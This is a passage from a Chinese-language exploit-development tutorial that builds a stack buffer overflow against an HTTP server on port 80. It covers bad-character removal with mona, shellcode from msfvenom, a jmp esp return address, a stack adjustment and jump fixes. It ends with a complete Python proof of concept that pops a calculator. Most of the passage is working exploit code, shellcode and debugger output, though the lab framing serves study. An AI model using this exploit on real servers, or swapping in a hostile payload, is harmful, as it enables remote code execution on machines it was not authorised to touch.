"\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4"
"\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4"
"\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

结果还是和之前相同重复操作几次，把`0x0b`，`0x0a`，`0x09`都去掉，也就是：

```php
!mona bytearray -cpb "\x00\x20\x2f\x3f\x0d\x0c\x0b\x0a\x09"
```

![Pasted image 20240330220301.png](images/attach-def4c354047d7bdb5442ce69b9e7f1404c4dc23c.png)

```php
"\x01\x02\x03\x04\x05\x06\x07\x08\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22\x23\x24\x25\x26"
"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x40\x41\x42\x43\x44\x45\x46\x47\x48"
"\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88"
"\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8"
"\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8"
"\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

现在可以断在`jmp esp`上面了：

![Pasted image 20240330221057.png](images/attach-b84a590119f94148be7321f68ab0353fc34d4bc9.png)

我们也可以使用`mona compare`验证一下，找到我们`0x01`的地址：

```php
0:003> db 00c7e750
00c7e750  01 02 03 04 05 06 07 08-0e 0f 10 11 12 13 14 15  ................
00c7e760  16 17 18 19 1a 1b 1c 1d-1e 1f 21 22 23 24 25 26  ..........!"#$%&
00c7e770  27 28 29 2a 2b 2c 2d 2e-30 31 32 33 34 35 36 37  '()*+,-.01234567
00c7e780  38 39 3a 3b 3c 3d 3e 40-41 42 43 44 45 46 47 48  89:;<=>@ABCDEFGH
00c7e790  49 4a 4b 4c 4d 4e 4f 50-51 52 53 54 55 56 57 58  IJKLMNOPQRSTUVWX
00c7e7a0  59 5a 5b 5c 5d 5e 5f 60-61 62 63 64 65 66 67 68  YZ[\]^_`abcdefgh
00c7e7b0  69 6a 6b 6c 6d 6e 6f 70-71 72 73 74 75 76 77 78  ijklmnopqrstuvwx
00c7e7c0  79 7a 7b 7c 7d 7e 7f 80-81 82 83 84 85 86 87 88  yz{|}~..........
```

`0x7e4456f7`下断点，然后运行：

```php
!mona compare -f "C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin" -a 0x00c7e750
```

可以看到unmodified，也就是说我们是正确的。

![Pasted image 20240330223311.png](images/attach-87da7cdb055a380b1bf2d49eff1baff03f7ab6e5.png)

现在我们创建一个没有错误字符编码的msf的shellcode。目前，我们只执行经典的calc.exe。

```php
┌──(name㉿kali)-[/opt/metasploit-framework/embedded/framework]
└─$ msfvenom -p windows/exec CMD=calc.exe -b "\x00\x20\x2f\x3f\x0d\x0c\x0b\x0a\x09" -f c --arch x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of c file: 952 bytes
unsigned char buf[] = 
"\xb8\x69\xfc\x2c\xd8\xdb\xc9\xd9\x74\x24\xf4\x5e\x29\xc9"
"\xb1\x31\x31\x46\x13\x83\xc6\x04\x03\x46\x66\x1e\xd9\x24"
"\x90\x5c\x22\xd5\x60\x01\xaa\x30\x51\x01\xc8\x31\xc1\xb1"
"\x9a\x14\xed\x3a\xce\x8c\x66\x4e\xc7\xa3\xcf\xe5\x31\x8d"
"\xd0\x56\x01\x8c\x52\xa5\x56\x6e\x6b\x66\xab\x6f\xac\x9b"
"\x46\x3d\x65\xd7\xf5\xd2\x02\xad\xc5\x59\x58\x23\x4e\xbd"
"\x28\x42\x7f\x10\x23\x1d\x5f\x92\xe0\x15\xd6\x8c\xe5\x10"
"\xa0\x27\xdd\xef\x33\xee\x2c\x0f\x9f\xcf\x81\xe2\xe1\x08"
"\x25\x1d\x94\x60\x56\xa0\xaf\xb6\x25\x7e\x25\x2d\x8d\xf5"
"\x9d\x89\x2c\xd9\x78\x59\x22\x96\x0f\x05\x26\x29\xc3\x3d"
"\x52\xa2\xe2\x91\xd3\xf0\xc0\x35\xb8\xa3\x69\x6f\x64\x05"
"\x95\x6f\xc7\xfa\x33\xfb\xe5\xef\x49\xa6\x63\xf1\xdc\xdc"
"\xc1\xf1\xde\xde\x75\x9a\xef\x55\x1a\xdd\xef\xbf\x5f\x11"
"\xba\xe2\xc9\xba\x63\x77\x48\xa7\x93\xad\x8e\xde\x17\x44"
"\x6e\x25\x07\x2d\x6b\x61\x8f\xdd\x01\xfa\x7a\xe2\xb6\xfb"
"\xae\x81\x59\x68\x32\x68\xfc\x08\xd1\x74";
```

- `-p windows/exec` 选择了 `windows/exec` 模块，用于在 Windows 系统上执行命令。
- `CMD=calc.exe` 指定了 shellcode 执行的命令，即启动计算器。
- `-b "\x00\x20\x2f\x3f\x0d\x0c\x0b\x0a\x09"` 指出了需要排除的坏字符集合。
- `-f c` 表示输出格式为 C 语言代码。
- `--arch x86` 确保生成的 shellcode 是针对 x86 架构的。
- `--platform windows` 指定了目标平台是 Windows。

当前poc如下：

```python
import sys
import socket
import struct

offset_eip = 967
offset_shellcode = 631
EIP = struct.pack('<I', 0x7e4456f7) # jmp esp ntdll.dll
ESP = '\xe9\x26\xfc\xff\xff' # jmp $-971: 
buffer = 'A' * offset_shellcode
shellcode = (
"\xb8\x69\xfc\x2c\xd8\xdb\xc9\xd9\x74\x24\xf4\x5e\x29\xc9"
"\xb1\x31\x31\x46\x13\x83\xc6\x04\x03\x46\x66\x1e\xd9\x24"
"\x90\x5c\x22\xd5\x60\x01\xaa\x30\x51\x01\xc8\x31\xc1\xb1"
"\x9a\x14\xed\x3a\xce\x8c\x66\x4e\xc7\xa3\xcf\xe5\x31\x8d"
"\xd0\x56\x01\x8c\x52\xa5\x56\x6e\x6b\x66\xab\x6f\xac\x9b"
"\x46\x3d\x65\xd7\xf5\xd2\x02\xad\xc5\x59\x58\x23\x4e\xbd"
"\x28\x42\x7f\x10\x23\x1d\x5f\x92\xe0\x15\xd6\x8c\xe5\x10"
"\xa0\x27\xdd\xef\x33\xee\x2c\x0f\x9f\xcf\x81\xe2\xe1\x08"
"\x25\x1d\x94\x60\x56\xa0\xaf\xb6\x25\x7e\x25\x2d\x8d\xf5"
"\x9d\x89\x2c\xd9\x78\x59\x22\x96\x0f\x05\x26\x29\xc3\x3d"
"\x52\xa2\xe2\x91\xd3\xf0\xc0\x35\xb8\xa3\x69\x6f\x64\x05"
"\x95\x6f\xc7\xfa\x33\xfb\xe5\xef\x49\xa6\x63\xf1\xdc\xdc"
"\xc1\xf1\xde\xde\x75\x9a\xef\x55\x1a\xdd\xef\xbf\x5f\x11"
"\xba\xe2\xc9\xba\x63\x77\x48\xa7\x93\xad\x8e\xde\x17\x44"
"\x6e\x25\x07\x2d\x6b\x61\x8f\xdd\x01\xfa\x7a\xe2\xb6\xfb"
"\xae\x81\x59\x68\x32\x68\xfc\x08\xd1\x74"
)
buffer += shellcode
buffer += 'A' * (offset_eip - len(buffer))
buffer += EIP
buffer += ESP
buffer += 'E' * (1500 - len(buffer))
HOST = '127.0.0.1'
PORT = 80

req = "GET /"+buffer+"HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(req)
data = s.recv(1024)
s.close()
print 'Received', repr(data)
```

运行构造好的poc，进行逐步调试：

```php
0:002> bp 7e4456f7
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\USER32.dll - 
0:002> g
Breakpoint 0 hit
eax=00000000 ebx=000000c8 ecx=7c90f641 edx=00000007 esi=00c7dd66 edi=00c7ff53
eip=7e4456f7 esp=00c7dc6c ebp=0000000e iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
USER32!DeregisterShellHookWindow+0x5437:
7e4456f7 ffe4            jmp     esp {00c7dc6c}
0:003> p
eax=00000000 ebx=000000c8 ecx=7c90f641 edx=00000007 esi=00c7dd66 edi=00c7ff53
eip=00c7dc6c esp=00c7dc6c ebp=0000000e iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
00c7dc6c e926fcffff      jmp     00c7d897
0:003> p
eax=00000000 ebx=000000c8 ecx=7c90f641 edx=00000007 esi=00c7dd66 edi=00c7ff53
eip=00c7d897 esp=00c7dc6c ebp=0000000e iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
00c7d897 b8a2f2d413      mov     eax,13D4F2A2h
0:003> dc eip
00c7d897  d4f2a2b8 d9d0d913 5af42474 31b1c929  ........t$.Z)..1
00c7d8a7  83134231 420304c2 ef2110ad 10ca5659  1B.....B..!.YV..
00c7d8b7  f5423799 7d3077a8 d332479a c0162316  .7B..w0}.G2..#..
00c7d8c7  e7bf41ad c699ef06 49d95c97 aa0e9f1b  .A.......\.I....
00c7d8d7  ab435022 f9ae8d63 ee1dd93c 859d9749  "PC.c...<...I...
00c7d8e7  7aa63901 2c8738d1 ce07636a c80e1fbf  .9.z.8.,jc......
00c7d8f7  63d81adc a5dbd016 88771967 cc89e848  ...c....g.w.H...
00c7d907  24fc136e f307ae8d e08d74ec cd35fe56  n..$.....t..V.5.
0:003> u eip
00c7d897 b8a2f2d413      mov     eax,13D4F2A2h
00c7d89c d9d0            fnop
00c7d89e d97424f4        fnstenv [esp-0Ch]
00c7d8a2 5a              pop     edx
00c7d8a3 29c9            sub     ecx,ecx
00c7d8a5 b131            mov     cl,31h
00c7d8a7 314213          xor     dword ptr [edx+13h],eax
00c7d8aa 83c204          add     edx,4
```

我们可以看到我们处于 shellcode `0xb8a2f2d413` 的开头。我们继续执行。如果一切顺利的话会弹出计算器，但我们却遇到了访问违规：

```php
0:003> g
(6c8.5c8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000002 ebx=000000c8 ecx=0000b48d edx=0000000e esi=00c7dd66 edi=00c7ff53
eip=00c7d94b esp=00c7dc70 ebp=00c7d8b8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
00c7d94b 0000            add     byte ptr [eax],al          ds:0023:00000002=??
```

EIP: 0x00c7d94b  
ESP: 0x00c7dc70

ESP指向堆栈上EIP下方的内存区域，EIP当前指向堆栈上的指令。因此，如果shellcode执行pop并弹出堆栈中的值，则shellcode本身可能会损坏。为了解决这个问题，我们必须将ESP移动到EIP指向的地址（我们的shellcode所在的地址）上方。我们使用msf的asm来获取对应的指令。  
这个实现方法是从ESP中减去1000字节：

```php
┌──(name㉿kali)-[/opt/metasploit-framework/embedded/framework]
└─$ /opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb
nasm > sub esp,3e8h
00000000  81ECE8030000      sub esp,0x3e8
nasm > 
```

也可以使用metasm生成：

```bash
┌──(name㉿kali)-[/opt/metasploit-framework/embedded/framework]
└─$ /opt/metasploit-framework/embedded/framework/tools/exploit/metasm_shell.rb
type "exit" or "quit" to quit
use ";" or "\n" for newline
type "file <file>" to parse a GAS assembler source file

metasm > sub esp,3e8h
"\x81\xec\xe8\x03\x00\x00"
```

我们可以看到生成的指令具有空字节（`\x00`），因此我们不能使用它。这可以通过使用负值进行添加操作来解决：

```php
metasm > add esp,-3e8h
"\x81\xc4\x18\xfc\xff\xff"
```

我们得到相同的结果，但这次没有空字节。现在，我们将这个指令放在漏洞利用的`jmp $-971`之前。

```python
import sys
import socket
import struct

offset_eip = 967
offset_shellcode = 631
EIP = struct.pack('<I', 0x7e4456f7) # jmp esp ntdll.dll

# bad bytes: "\x00\x20\x2f\x3f\x0d\x0c\x0b\x0a\x09"

ESP = '\x81\xc4\x18\xfc\xff\xff' # add esp,-3e8h; 6 bytes
ESP += '\xe9\x26\xfc\xff\xff' # jmp $-971; "\xe9\x2a\xfc\xff\xff": jmp $-977
buffer = 'A' * offset_shellcode

# windows/exec CMD=calc.exe
shellcode = (
"\xb8\x69\xfc\x2c\xd8\xdb\xc9\xd9\x74\x24\xf4\x5e\x29\xc9"
"\xb1\x31\x31\x46\x13\x83\xc6\x04\x03\x46\x66\x1e\xd9\x24"
"\x90\x5c\x22\xd5\x60\x01\xaa\x30\x51\x01\xc8\x31\xc1\xb1"
"\x9a\x14\xed\x3a\xce\x8c\x66\x4e\xc7\xa3\xcf\xe5\x31\x8d"
"\xd0\x56\x01\x8c\x52\xa5\x56\x6e\x6b\x66\xab\x6f\xac\x9b"
"\x46\x3d\x65\xd7\xf5\xd2\x02\xad\xc5\x59\x58\x23\x4e\xbd"
"\x28\x42\x7f\x10\x23\x1d\x5f\x92\xe0\x15\xd6\x8c\xe5\x10"
"\xa0\x27\xdd\xef\x33\xee\x2c\x0f\x9f\xcf\x81\xe2\xe1\x08"
"\x25\x1d\x94\x60\x56\xa0\xaf\xb6\x25\x7e\x25\x2d\x8d\xf5"
"\x9d\x89\x2c\xd9\x78\x59\x22\x96\x0f\x05\x26\x29\xc3\x3d"
"\x52\xa2\xe2\x91\xd3\xf0\xc0\x35\xb8\xa3\x69\x6f\x64\x05"
"\x95\x6f\xc7\xfa\x33\xfb\xe5\xef\x49\xa6\x63\xf1\xdc\xdc"
"\xc1\xf1\xde\xde\x75\x9a\xef\x55\x1a\xdd\xef\xbf\x5f\x11"
"\xba\xe2\xc9\xba\x63\x77\x48\xa7\x93\xad\x8e\xde\x17\x44"
"\x6e\x25\x07\x2d\x6b\x61\x8f\xdd\x01\xfa\x7a\xe2\xb6\xfb"
"\xae\x81\x59\x68\x32\x68\xfc\x08\xd1\x74"
)
buffer += shellcode
buffer += 'A' * (offset_eip - len(buffer))
buffer += EIP
buffer += ESP
buffer += 'E' * (1500 - len(buffer))
HOST = '127.0.0.1'
PORT = 80

req = "GET /"+buffer+"HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(req)
data = s.recv(1024)
s.close()
print 'Received', repr(data)

```

还是没有准确落到shellcode上面，手动查一下，sellcode在`0x00c7d897`：

```php
0:003> r
eax=00000000 ebx=000000c8 ecx=7c90f641 edx=00000007 esi=00c7dd66 edi=00c7ff53
eip=00c7d8a1 esp=00c7d884 ebp=0000000e iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
00c7d8a1 f4              hlt
0:003> dc 00c7d897
00c7d897  d4f2a2b8 d9d0d913 5af42474 31b1c929  ........t$.Z)..1
00c7d8a7  83134231 420304c2 ef2110ad 10ca5659  1B.....B..!.YV..
00c7d8b7  f5423799 7d3077a8 d332479a c0162316  .7B..w0}.G2..#..
00c7d8c7  e7bf41ad c699ef06 49d95c97 aa0e9f1b  .A.......\.I....
00c7d8d7  ab435022 f9ae8d63 ee1dd93c 859d9749  "PC.c...<...I...
00c7d8e7  7aa63901 2c8738d1 ce07636a c80e1fbf  .9.z.8.,jc......
00c7d8f7  63d81adc a5dbd016 88771967 cc89e848  ...c....g.w.H...
00c7d907  24fc136e f307ae8d e08d74ec cd35fe56  n..$.....t..V.5.
0:003> u 00c7d897
00c7d897 b8a2f2d413      mov     eax,13D4F2A2h
00c7d89c d9d0            fnop
00c7d89e d97424f4        fnstenv [esp-0Ch]
00c7d8a2 5a              pop     edx
00c7d8a3 29c9            sub     ecx,ecx
00c7d8a5 b131            mov     cl,31h
00c7d8a7 314213          xor     dword ptr [edx+13h],eax
00c7d8aa 83c204          add     edx,4
```

原本的栈中往低地址处跳的跳转有问题，我们需要调整一下：

![Pasted image 20240331145841.png](images/attach-62abf2c87115f06b4570663b80adda9ad38c713c.png)

![Pasted image 20240331151441.png](images/attach-278bba9b03072bea25d3737f3dae82b13198549c.png)

```php
metasm > jmp $-987
"\xe9\x20\xfc\xff\xff"
```

其中`\0x20`是坏字符，需要修改一下poc，offset\_shellcode改为641，对应：

```php
metasm > jmp $-977
"\xe9\x2a\xfc\xff\xff"
```

完整poc如下：

```python
import sys
import socket
import struct

offset_eip = 967
offset_shellcode = 641
EIP = struct.pack('<I', 0x7e4456f7) # jmp esp ntdll.dll

# bad bytes: "\x00\x20\x2f\x3f\x0d\x0c\x0b\x0a\x09"

ESP = '\x81\xc4\x18\xfc\xff\xff' # add esp,-3e8h
ESP += "\xe9\x2a\xfc\xff\xff"
buffer = 'A' * offset_shellcode
shellcode = (
"\xb8\x69\xfc\x2c\xd8\xdb\xc9\xd9\x74\x24\xf4\x5e\x29\xc9"
"\xb1\x31\x31\x46\x13\x83\xc6\x04\x03\x46\x66\x1e\xd9\x24"
"\x90\x5c\x22\xd5\x60\x01\xaa\x30\x51\x01\xc8\x31\xc1\xb1"
"\x9a\x14\xed\x3a\xce\x8c\x66\x4e\xc7\xa3\xcf\xe5\x31\x8d"
"\xd0\x56\x01\x8c\x52\xa5\x56\x6e\x6b\x66\xab\x6f\xac\x9b"
"\x46\x3d\x65\xd7\xf5\xd2\x02\xad\xc5\x59\x58\x23\x4e\xbd"
"\x28\x42\x7f\x10\x23\x1d\x5f\x92\xe0\x15\xd6\x8c\xe5\x10"
"\xa0\x27\xdd\xef\x33\xee\x2c\x0f\x9f\xcf\x81\xe2\xe1\x08"
"\x25\x1d\x94\x60\x56\xa0\xaf\xb6\x25\x7e\x25\x2d\x8d\xf5"
"\x9d\x89\x2c\xd9\x78\x59\x22\x96\x0f\x05\x26\x29\xc3\x3d"
"\x52\xa2\xe2\x91\xd3\xf0\xc0\x35\xb8\xa3\x69\x6f\x64\x05"
"\x95\x6f\xc7\xfa\x33\xfb\xe5\xef\x49\xa6\x63\xf1\xdc\xdc"
"\xc1\xf1\xde\xde\x75\x9a\xef\x55\x1a\xdd\xef\xbf\x5f\x11"
"\xba\xe2\xc9\xba\x63\x77\x48\xa7\x93\xad\x8e\xde\x17\x44"
"\x6e\x25\x07\x2d\x6b\x61\x8f\xdd\x01\xfa\x7a\xe2\xb6\xfb"
"\xae\x81\x59\x68\x32\x68\xfc\x08\xd1\x74"
)
buffer += shellcode
buffer += 'A' * (offset_eip - len(buffer))
buffer += EIP
buffer += ESP
buffer += 'E' * (1500 - len(buffer))
HOST = '127.0.0.1'
PORT = 80

req = "GET /"+buffer+"HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(req)
data = s.recv(1024)
s.close()
print 'Received', repr(data)
```

可以看到已经弹计算器了，我们的exp已经顺利完成：

![Pasted image 20240331161809.png](images/attach-0c7cd77ec06ea69c556d7286c6df3dfffa16be60.png)
